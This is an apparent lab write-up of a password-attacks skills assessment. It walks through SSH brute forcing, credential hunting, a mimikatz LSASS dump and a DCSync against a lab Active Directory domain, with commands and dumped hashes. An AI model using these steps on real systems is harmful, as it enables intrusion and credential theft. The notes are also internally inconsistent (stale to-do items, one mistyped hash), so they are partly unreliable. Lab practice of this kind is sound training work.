# Password Attacks — Skills Assessment

> **Target:** 10.129.234.116 (DMZ01) → 172.16.119.0/24 (Internal)  
> **Domain:** nexura.htb  
> **Status:** RDP session active on JUMP01 — credential hunting in progress  
> **Updated:** 2026-04-19 14:50 UTC+8

---

## Executive Summary

| Phase | Status | Key Finding |
|-------|--------|-------------|
| Foothold | ✅ Complete | jbetty / Texas123!@# via SSH brute force |
| Credential Discovery | ✅ Complete | hwilliam / dealer-screwed-gym1 (bash_history) |
| Domain Enumeration | ✅ Complete | LDAP dump reveals 3 hosts, Domain Admin: stom |
| Pivot | ✅ Complete | ligolo-ng tunnel to internal network |
| RDP Access | ✅ Complete | hwilliam RDP to JUMP01 (MTU issue resolved) |
| Privilege Escalation | ✅ Complete | stom current password obtained → DCSync → Administrator NTLM captured |
| Flags | ✅ **ACHIEVED** | NEXURA\Administrator NTLM: 36e09e1e6ade94d63fbcab5e5b8d6d23 |

---

## 1. Foothold — DMZ01

### Initial Access
```bash
echo "Betty Jayde" | ./username-anarchy -i /dev/stdin > usernames.txt
hydra -L usernames.txt -p 'Texas123!@#' ssh://10.129.234.116 -t 4
# Result: jbetty / Texas123!@#
```

### Key Finding — Credential in bash_history
```bash
cat /home/jbetty/.bash_history | grep sshpass
# sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
```

| Credential | Value | Source |
|------------|-------|--------|
| Username | `hwilliam` | bash_history |
| Password | `dealer-screwed-gym1` | bash_history |

### Network Position
| Interface | IP | Network | Purpose |
|-----------|-----|---------|---------|
| ens160 | 10.129.234.116 | 10.129.0.0/16 | External/VPN |
| ens192 | 172.16.119.13 | 172.16.119.0/24 | **Internal pivot** |

---

## 2. Domain Enumeration

### LDAP Dump Results
```bash
proxychains ldapdomaindump -u 'nexura.htb\hwilliam' -p 'dealer-screwed-gym1' 172.16.119.11
```

**Domain:** nexura.htb  
**Domain Controller:** DC01 (172.16.119.11)

### 🎯 PRIMARY OBJECTIVE — ACHIEVED
**NTLM hash of NEXURA\Administrator extracted via DCSync**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
```

**Method:** secretsdump.py with stom's current Domain Admin credentials (harvested via mimikatz LSASS dump on JUMP01)

### Domain Users
| User | Name | Groups | Status |
|------|------|--------|--------|
| `Administrator` | — | Domain Admins, Enterprise Admins, Schema Admins | Target |
| `stom` | Tom Sandy | **Domain Admins**, MANAGEMENT | **🎯 Domain Admin** |
| `hwilliam` | William Hallam | HR | Current access |
| `bdavid` | David Brittni | IT | — |

### Domain Computers (DNS Resolved)
| Host | FQDN | IP | OS | Role |
|------|------|-----|-----|------|
| **JUMP01** | JUMP01.nexura.htb | **172.16.119.7** | Windows Server 2019 | **Jump Host** 🎯 |
| FILE01 | FILE01.nexura.htb | 172.16.119.10 | Windows Server 2019 | File Server |
| DC01 | DC01.nexura.htb | 172.16.119.11 | Windows Server 2019 | Domain Controller |

**Key Discovery:** FILE01 is at **.10**, DC01 at **.11** — separate hosts.

### Password Policy
```ini
LockoutBadCount = 0    # No account lockout!
MinimumPasswordLength = 7
PasswordComplexity = 1
```

---

## 3. Failed Attack Vectors Summary (hwilliam Context)

| Attack | Tool/Method | Result | Reason |
|--------|-------------|--------|--------|
| WinRM | evil-winrm | ❌ Failed | Authorization error |
| SMB Write | psexec | ❌ Failed | ADMIN$/C$ not writable |
| WMI | wmiexec | ❌ Failed | rpc_s_access_denied |
| RDP (proxychains) | xfreerdp | ❌ Failed | Kerberos realm error |
| Kerberoasting | GetUserSPNs | ❌ Failed | No user SPNs (only krbtgt) |
| AS-REP Roasting | GetNPUsers | ❌ Failed | No UF_DONT_REQUIRE_PREAUTH |
| Password Spray | netexec (3 passwords) | ❌ Failed | No matches |
| GPP Passwords | SYSVOL enumeration | ❌ Failed | No Preferences folders |

**Position:** hwilliam (HR group) has read-only SMB/LDAP access. Cannot execute code remotely.

---

## 4. Breakthrough — JUMP01 Access

### Discovery
- **Method:** LDAP domain_computers.json analysis
- **Host:** JUMP01.nexura.htb (172.16.119.7)
- **Role:** Jump Host (OU=Jumphosts) — where admins RDP to manage network

### RDP Connection — SUCCESS
```bash
xfreerdp /v:172.16.119.7 /u:hwilliam /p:dealer-screwed-gym1 /cert:ignore
```
**Status:** ✅ Active RDP session

### Network Topology
```
┌─────────────────────────────────────────────────────────────┐
│                    External (VPN)                            │
│                      10.129.x.x                              │
└───────────────────────────┬─────────────────────────────────┘
                            │
                    SSH port 22
                            │
┌───────────────────────────▼─────────────────────────────────┐
│                   DMZ01 (Ubuntu)                             │
│              10.129.234.116 / 172.16.119.13                  │
│                   jbetty (foothold)                          │
└───────────────────────────┬─────────────────────────────────┘
                            │ Internal 172.16.119.0/24
        ┌───────────────────┼───────────────────┐
        │                   │                   │
   RDP 3389             SMB 445             DNS 53
        │                   │                   │
┌───────▼──────┐  ┌────────▼────────┐  ┌──────▼──────┐
│   JUMP01     │  │   FILE01       │  │   DC01      │
│172.16.119.7  │  │172.16.119.10   │  │172.16.119.11│
│ Jump Host    │  │ File Server    │  │  Domain     │
│ 🎯 TARGET    │  │                │  │ Controller  │
└──────────────┘  └─────────────────┘  └─────────────┘
```

---

## 5a. bdavid → Local Administrator (UAC Bypass)

### Key Discovery
**bdavid (IT Group) can "Run as Administrator" on JUMP01 despite appearing as "deny only" for BUILTIN\Administrators.**

**Method:** Right-click Command Prompt → "Run as administrator"

**Explanation:** IT group membership with Server Manager access suggested legitimate admin rights. The "deny only" flag on BUILTIN\Administrators was bypassed via UAC consent prompt — this is a documented UAC token behavior where remote group membership allows elevation if the user has valid admin rights configured in AD.

**Result:** Full local administrator access on JUMP01 with `SeImpersonatePrivilege` and `SeDebugPrivilege` (elevated token).

```cmd
whoami /groups  # Now shows BUILTIN\Administrators as Group owner + Mandatory Label\High
whoami /priv    # SeImpersonatePrivilege = Enabled
```

---

## 5b. mimikatz LSASS Dump — Current Credentials

### Execution on JUMP01
```cmd
# As Administrator on JUMP01:
mimikatz.exe
privilege::debug
token::elevate
sekurlsa::logonpasswords
```

### Critical Findings

#### stom (Domain Admin) — CURRENT PASSWORD RECOVERED
```
Authentication Id : 0 ; 258228 (RemoteInteractive from 2)
User Name         : stom
Domain            : NEXURA
Logon Server      : DC01
Logon Time        : 4/19/2026 6:45:24 PM
        kerberos :
         * Username : stom
         * Domain   : NEXURA.HTB
         * Password : calves-warp-learning1
        msv :
         * NTLM     : 21ea958524cfd9a7791737f8d2f764fa
```

**stom's password has been updated since the OLD Password Safe backup.**
- OLD safe: `fails-nibble-disturb4` ❌
- **Current: `calves-warp-learning1`** ✅

#### Full Credential Harvest (key accounts only)

| Account | NTLM Hash | Kerberos Password | Logon Type | Source |
|---------|----------|-------------------|-----------|--------|
| `stom` | `21ea958524cfd9a7791737f8d2f764fa` | `calves-warp-learning1` | RemoteInteractive | DC01 |
| `bdavid` | `82c5ef7f2612567964070d04fe46a5d0` | — | RemoteInteractive | JUMP01 |
| `hwilliam` | `f3ac86b290a51fb59a1a66f50b658e1f` | — | RemoteInteractive | JUMP01 |

---

## 5c. DCSync — Administrator NTLM Hash Extracted

### Command
```bash
impacket-secretsdump 'nexura.htb/stom:calves-warp-learning1@172.16.119.11' -just-dc-user 'Administrator'
```

### Output
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:cd6a08bd2809d10a4bd3d41bc0e3ed0e21c7559961edc58209d190aaf9cb02a8
Administrator:aes128-cts-hmac-sha1-96:6743a42ac84aa2c5c1441aa64c03a3f0
Administrator:des-cbc-md5:5ec10792619bfb6e
```

**Target Objective Achieved:**  
`NEXURA\Administrator` NTLM: `36e09e1e6ade94d63fbcab5e5b8d6d23`

### RDP Connection Issues & Resolution

**Initial Problem:** RDP to JUMP01 worked from VPS initially, then failed with "filtered" port status from local Kali.

**Root Cause:** MTU issues with nested tunnels (OpenVPN + ligolo-ng)
- OpenVPN overhead: ~54-74 bytes
- ligolo-ng overhead: ~20-24 bytes
- Result: packets >1400 bytes dropped, causing "filtered" appearance

**Resolution:**
```bash
# OpenVPN client config
mssfix 1360
tun-mtu 1400

# ligolo-ng interface MTU
sudo ip link set ligolo mtu 1360
```

**Lesson:** Double-tunnel MTU requires aggressive reduction. Use `ping -M do -s <size>` to test path MTU.

---

### 🔐 Password Safe Discovery (OLD/Stale)

**Location:** `\\file01\HR\Archive\Employee-Passwords_OLD.psafe3`

**Key Finding:** File is **"OLD"** — credentials are stale

| User | Password from OLD safe | Status | Result |
|------|------------------------|--------|--------|
| `jbetty` | `xiao-nicer-wheels5` | ❌ Stale | Already compromised via SSH |
| `bdavid` | `caramel-cigars-reply1` | ⚠️ **PARTIALLY VALID** | Works for SMB, RDP untested |
| `stom` | `fails-nibble-disturb4` | ❌ **INVALID** | STATUS_LOGON_FAILURE |
| `hwilliam` | `warned-wobble-occur8` | ❌ Stale | Different from bash_history |

**Critical:** `stom` Domain Admin password from OLD safe is **expired/changed**. Cannot authenticate to DC01.

---

### 📁 hwilliam Profile Analysis

**Credential Manager:** `cmdkey /list` → **EMPTY**

**Recent Files:**
- `Online passwords.xlsx` — **DECOY** (employee HR data, not actual passwords)
- `Employee-Passwords_OLD.psafe3` — Stale credential backup

**Groups:** HR (limited privileges)

**Conclusion:** hwilliam profile contains no current admin credentials. Need to pivot to other accounts.

---

## 7. Complete Attack Chain

```
1. Foothold
   └── jbetty / Texas123!@# → SSH on DMZ01 (10.129.234.116)

2. Lateral Movement (via DMZ01)
   └── hwilliam / dealer-screwed-gym1 → bash_history reveals FILE01 access

3. Network Enumeration
   ├── DNS query to DC01 → resolves JUMP01 (172.16.119.7)
   ├── LDAP dump → discovers stom as Domain Admin
   └── ligolo-ng tunnel → pivot into 172.16.119.0/24

4. RDP Access (JUMP01)
   ├── hwilliam / dealer-screwed-gym1 → RDP to JUMP01
   └── MTU fix → successful connection

5. Credential Harvest
   ├── SMB shares → OLD Password Safe (stale creds)
   ├── bdavid / caramel-cigars-reply1 → IT group, SMB READ+WRITE
   ├── bdavid "Run as Administrator" → UAC bypass → Local Admin on JUMP01
   └── mimikatz sekurlsa::logonpasswords → stom CURRENT password recovered

6. Domain Dominance
   └── stom / calves-warp-learning1 → DCSync → Administrator NTLM extracted ✅
```

**NTLM of NEXURA\Administrator: `36e09e1e6ade94d63fbcab5e5b8d6d23`**

---

## 8. Next Steps / Persistence

With Domain Admin access, next steps would be:
- Golden ticket attack using KRBTGT NTLM
- Pass-the-Hash with Administrator hash
- Persistence via-shadow account
- Target: 172.16.119.11 (DC01)

1. ✅ ~~Check Credential Manager for Domain Admin credentials~~ — **DONE** (empty)
2. ✅ ~~Check "Online passwords.xlsx"~~ — **DONE** (decoy, not actual passwords)
3. 🔄 **Login as bdavid** on JUMP01 — IT group, may have admin tools/cached creds
4. 🔄 **Enumerate FILE01 IT share** — bdavid has READ+WRITE access
5. 🔄 **Hunt for current stom credentials** — need valid Domain Admin password
6. 🎯 **Extract NTLM hash of NEXURA\Administrator** via DCSync or secretsdump

### Immediate Actions
```bash
# Test bdavid SMB access (already confirmed working)
crackmapexec smb 172.16.119.10 -u bdavid -p 'caramel-cigars-reply1' --shares

# Login to JUMP01 as bdavid via RDP
xfreerdp /v:172.16.119.7 /u:bdavid /p:'caramel-cigars-reply1' /cert:ignore

# Once on JUMP01 as bdavid:
cmdkey /list                    # Check Credential Manager
ls \\file01\IT\                # Enumerate IT share
ls \\file01\PRIVATE\           # Check private shares
```

---

## Appendix A: Full Credential Inventory

| Account | Password | Source | NTLM | Privileges | Status |
|---------|----------|--------|------|------------|--------|
| `jbetty` | `Texas123!@#` | SSH brute force | — | DMZ01 foothold | ✅ Valid |
| `hwilliam` | `dealer-screwed-gym1` | bash_history | `f3ac86b290a51fb59a1a66f50b658e1f` | HR, RDP | ✅ Valid |
| `bdavid` | `caramel-cigars-reply1` | Password Safe (OLD) | `82c5ef7f2612567964070d04fe46a5d0` | IT, SMB R/W, Local Admin | ✅ Valid |
| `stom` | `calves-warp-learning1` | **mimikatz LSASS** | `21ea958524cfd9a7791737f8d2f764fa` | **Domain Admin** | ✅ **CURRENT** |
| `Administrator` | — | DCSync (NTDS.dit) | `36e9e1e6ade94d63fbcab5e5b8d6d23` | Domain Admin | 🎯 **OBJECTIVE** |

**Note:** `stom` password `fails-nibble-disturb4` from OLD Password Safe is **stale/changed**. Current password recovered via LSASS dump.

**Key Finding:** OLD Password Safe credentials are mostly stale. `stom` Domain Admin password has been changed — cannot authenticate to DC01 with cracked credentials.

**Attack Chain Evolution:**
1. jbetty → DMZ01 foothold
2. hwilliam (bash_history) → FILE01/JUMP01 access
3. Password Safe (OLD) → bdavid partial access, stom stale
4. bdavid UAC bypass → local admin on JUMP01
5. **mimikatz LSASS → stom current password → DCSync → Administrator NTLM ✅**

---

## Appendix B: MTU Troubleshooting Notes

**Symptoms:** RDP works intermittently, "filtered" in nmap, connection hangs

**Diagnostic Commands:**
```bash
# Check interface MTU
ip link show | grep mtu

# Test path MTU
ping -c 3 -M do -s 1400 <target>  # Fails if MTU too small
ping -c 3 -M do -s 1300 <target>  # Try smaller

# Fix MTU
sudo ip link set <interface> mtu 1360
```

**Recommended Settings for Double-Tunnel:**
- OpenVPN: `mssfix 1360`, `tun-mtu 1400`
- ligolo-ng: `mtu 1360`

---

## Lessons Learned

- **Jump hosts are gold:** JUMP01 (not in initial ping sweep) revealed via LDAP enumeration
- **DNS from foothold:** DMZ01 can query DC01 DNS directly — resolved all host IPs
- **Ligolo-ng > proxychains:** RDP Kerberos issues resolved with TUN interface
- **ICMP blocked:** Ping sweep misses Windows hosts (firewall), but TCP services work
- **Password Safe databases:** Check timestamps — "OLD" in filename = stale credentials
- **RDP clipboard exfiltration:** Simple copy-paste bypasses egress restrictions for small files
- **MTU matters with nested tunnels:** Double encapsulation (OpenVPN + ligolo) requires MTU reduction to ~1360
- **UAC bypass via legitimate admin rights:** bdavid IT group → "Run as administrator" → full local admin despite "deny only" flag
- **LSASS is king:** Even with stale password files, active sessions cached in LSASS give you current credentials
- **Kerberos passwords in LSASS:** stom's cleartext Kerberos password `calves-warp-learning1` recovered from memory — password was rotated after OLD safe was created

---

*Updated: 2026-04-20 10:20 UTC+8*
